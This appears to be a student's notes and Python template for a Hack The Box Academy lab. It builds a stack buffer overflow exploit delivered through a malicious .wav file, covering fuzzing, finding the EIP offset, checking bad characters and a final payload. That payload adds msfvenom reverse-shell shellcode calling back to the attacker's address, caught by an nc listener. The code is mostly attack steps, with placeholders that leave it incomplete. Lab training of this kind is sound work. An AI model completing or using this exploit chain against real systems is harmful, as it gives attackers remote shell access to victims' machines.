#local invasion cd.extract

#Connecting to the VPN:
sudo openvpn #the_vpn_file_here
#Entering the lab:
xfreerdp /v:#target_ip /u:htb-student /p:'Academy_student!'

#import
from struct import pack

#fuzzer.py
def fuzz():
	size = 1000 #number of bytes
	payload = b"A" * size

	try:
		with open("crash.wav", "wb") as f: #A "crash" file is created with the specified number of bytes.
			f.write(payload)
		print(f"crash.wav file created with {size} bytes")
	except Exception as e:
		print("Error creating file")
fuzz()

#eip_offset
def eip_offset():
^   payload = bytes(#"erc --pattern c #the number where it breaks#" in dbg#, "utf-8")
    with open("pattern.wav","wb") as f:
        f.write(payload)

eip_offset()

#control
def eip_control():
    offset = (#erc --pattern o EIP/ASCII value)
    buffer = b"A" * offset
    eip = b"B" * 4
    payload = buffer + eip
 
    with open("control.wav", "wb") as f:
        f.write(payload)
#save "ESP" value
eip_control()

#chars
def bad_chars():
    all_chars = bytes([#erc --bytearray])
    offset = #erc --pattern o EIP/ASCII value
    buffer = b"A" * offset
    eip = b"BBBB"
 
    payload = buffer + eip + all_chars
 
    with open("chars.wav", "wb") as file:
        file.write(payload)
 
 bad_chars()
 #after attaching "chars", erc --compare #ESP_value #path_to_ByteArray_1.bin_file
 #example:"erc --compare 0014F974 C:\Users\htb-student\Desktop\byteArray_1.bin"
 
 #Exploit
def exploit():
    #msfvenom -p windows/shell_reverse_tcp LHOST=#ip_vpn# LPORT=4433 -f 'python'
    offset = (#erc --pattern o EIP/ASCII value)
    buffer = b"D" * offset
    eip = pack("<L", 0x#"ESP" value)
    nop = b"\x90" * 16
 
    payload = buffer + eip + nop + buf
 
    with open("exploit.wav", "wb") as e:
        e.write(payload)

exploit()
#"nc -lnvp 4433" to listen on the port